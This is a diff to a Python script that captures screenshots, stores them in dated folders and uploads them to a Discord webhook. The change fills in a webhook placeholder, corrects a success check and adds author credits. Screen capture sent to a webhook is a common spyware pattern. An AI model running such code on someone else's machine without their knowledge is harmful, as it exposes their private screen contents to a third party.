@@ -8,7 +8,7 @@ from PIL import ImageGrab
 base_dir = r'YOUR_DIR'
 
 # Define the Discord webhook URL
-discord_webhook_url = ""
+discord_webhook_url = "YOUR_WEBHOOK_URL_HERE"
 
 def create_day_folder():
     """Create a folder for the current day if it doesn't exist."""
@@ -57,7 +57,7 @@ def send_screenshot_to_discord(screenshot_path):
         # Send the screenshot to Discord
         response = requests.post(discord_webhook_url, data=payload, files=files)
         
-        if response.status_code == 1:
+        if response.status_code == 200:
             print(f"Screenshot sent to Discord successfully: {screenshot_path}")
             print("created by Manjeet43")
         else:
@@ -82,4 +82,4 @@ if __name__ == "__main__":
     main()
 
 
-
+# CREATED BY TIKTAKICEMAN
